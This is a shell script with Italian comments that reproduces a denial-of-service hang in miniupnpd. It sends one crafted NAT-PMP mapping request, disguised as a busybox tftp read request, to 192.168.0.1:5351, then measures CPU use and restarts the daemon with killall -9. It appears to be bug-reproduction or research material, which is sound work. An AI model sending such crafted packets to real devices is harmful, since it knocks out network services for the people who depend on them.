#!/bin/sh
# Riproduce il blocco di miniupnpd con una sola richiesta NAT-PMP di mappatura e lo lascia riavviato e sano.
# MODIFICA LO STATO: riavvia miniupnpd due volte come fa QCMAP EnableUPNP (killall -9 + /etc/init.d/miniupnpd start).
# La richiesta è un RRQ di busybox tftp verso 192.168.0.1:5351: i byte 00 01 valgono come versione 0 e opcode 1
# (mappatura UDP), il nome file "AAbbccdddd" dà riservato "AA", porta interna 0x6262, porta esterna 0x6363 e
# durata 0x64646464 (tutte diverse da zero, quindi il ramo con il ciclo infinito).
# Uso sul device: sh /cache/dwr_natpmp_repro.sh

cpu() { awk '{print $14}' /proc/$1/stat; }
# Percentuale di CPU utente del processo $1 in 5 s (HZ 100: tick / 5)
misura() { a=$(cpu $1); sleep 5; b=$(cpu $1); echo $(((b - a) / 5)); }
riavvia() { killall -9 miniupnpd 2>/dev/null; sleep 1; /etc/init.d/miniupnpd start; sleep 2; pidof miniupnpd; }
pc() { i=0; while [ $i -lt 50 ]; do awk '{printf "%x\n", $30}' /proc/$1/stat; i=$((i + 1)); done | sort | uniq -c | sort -rn | head -4; }

P=$(pidof miniupnpd)
echo "prima: pid $P, CPU $(misura $P)%"
P=$(riavvia)
echo "riavviato: pid $P"
echo "a riposo: CPU $(misura $P)%, socket 5351 aperti: $(grep -c ':14E7 ' /proc/net/udp)"
tftp -g -r AAbbccdddd -l /dev/null 192.168.0.1 5351 >/dev/null 2>&1 &
T=$!
sleep 3
kill $T 2>/dev/null
echo "dopo UNA richiesta NAT-PMP di mappatura: CPU $(misura $P)%, stato $(awk '{print $3}' /proc/$P/stat)"
echo "PC del thread principale (50 campioni):"
pc $P
P=$(riavvia)
echo "riavviato di nuovo: pid $P, CPU $(misura $P)%"
